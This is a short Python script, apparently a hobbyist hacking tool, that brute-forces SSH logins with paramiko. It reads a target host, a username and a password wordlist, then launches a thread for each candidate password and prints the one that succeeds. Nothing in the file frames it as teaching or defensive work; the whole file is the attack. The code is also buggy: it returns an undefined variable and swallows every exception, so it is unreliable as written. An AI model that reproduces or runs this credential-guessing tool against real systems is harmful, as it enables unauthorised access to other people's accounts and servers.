import sys
import os
import socket
import threading
import time

import termcolor
import paramiko

stop_flag = 0


def ssh_connect(password):
    global stop_flag

    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(host, port=22, username=username, password=password)
        stop_flag = 1
        print(
            termcolor.colored(
                f"[+] found password: {password} for account {username}",
                'green'
            )
        )
    except:
        print(
            termcolor.colored(
                f"[-] incorrect login {password}",
                "red"
            )
        )
    ssh.close()
    return code


host = input("[+] target addrress: ")
username = input("[+] SSH username: ")
input_file = input("[+] Passwords file: ")

if not os.path.exists(input_file):
    print(f"[!!] the file {input_file} does not exist")
    exit(1)

print(f"* * * starting threaded SSH brute force on {host} with account {username} * * *")

with open(input_file) as file:
    for line in file.readlines():
        if stop_flag:
            t.join()
            exit()
        password = line.strip()
        t = threading.Thread(
            target=ssh_connect,
            args=(password,)
        )
        t.start()
        time.sleep(0.5)
